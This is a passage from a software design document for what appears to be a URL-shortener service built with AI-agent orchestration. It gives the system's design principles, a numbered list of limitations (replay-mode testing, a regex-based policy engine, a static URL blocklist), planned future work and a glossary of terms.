- **Modular**: Maven modules plus hexagonal ports (`LinkCache`, `RateLimiter`, `ClickEventPublisher`, `LlmGateway`, `EventStore`, `CheckpointManager`, `PolicyEngine`). The core has no framework dependencies, enforced by ArchUnit.
- **Testable**: injected `Clock`, fakes for every port, replay LLM, Testcontainers, property tests.
- **Reliable**: graceful degradation, bounded resources everywhere (queues, retries, budgets), crash recovery.
- **Secure**: least privilege for agents, validation at the edges, hashed keys, no raw PII, deny-by-default commands.
- **Scalable**: stateless services, cache layers, an explicit scaling path.
- **Safe change management**: agent branches, checkpoints, policy-gated writes, human-approved merge, versioned policy snapshots.

---

## 10. Assumptions and Limitations (honest list)

**Assumptions:** A-1 to A-5 in BUILD_PLAN §1.4.

**Limitations:**
- **L-1** Replay mode proves the orchestration logic, not live LLM quality. Live runs vary.
- **L-2** A single coordinator per process. No HA failover (state can be recovered, but there is no automatic leader election).
- **L-3** Analytics are at-most-once, and unique counts are approximate (±0.81 %).
- **L-4** The policy engine is regex/glob-based. It is not a semantic code analysis and can be evaded by obfuscated code. Human review is the backstop.
- **L-5** Auth is API keys only. No SSO, no fine-grained RBAC beyond three roles.
- **L-6** The audit chain is tamper-evident, not tamper-proof, without external anchoring.
- **L-7** The CodeIndexTool is a regex-based repo map, not a full AST/call-graph. Impact analysis can miss reflection-based or config-driven coupling.
- **L-8** No real deployment stage. "Publish" is a local merge.
- **L-9** Malicious URL detection is limited to a static blocklist. There is no threat-intel integration.

**Future work:** OPA for policies, Temporal backend, AST-based code index (JavaParser), external audit anchoring, Kafka analytics, OIDC, PR creation on GitHub instead of a local merge, cost dashboards, an evaluation harness that scores agent outputs across runs.

---

## 11. Glossary

- **Gate**: a deterministic pass/fail check before (entry) or after (exit) a stage.
- **Join / synchronization**: a stage that becomes READY only when all its parallel upstream branches are done.
- **Checkpoint**: a git commit on the agent branch, recorded before or after a mutating stage, used for rollback.
- **Re-plan**: recomputing and re-executing the parts of the DAG downstream of a changed input.
- **Lineage**: the graph of which inputs, agent, model and prompt produced an artifact.
- **Safe-stop**: a controlled halt that keeps state so the run can resume.
- **Autonomy level**: a configured trust tier that sets which actions agents may take without approval.
- **HLL (HyperLogLog)**: a probabilistic distinct-count sketch with fixed memory.
- **Feistel network**: a construction that turns any function into an invertible permutation. We use it here to scramble IDs.
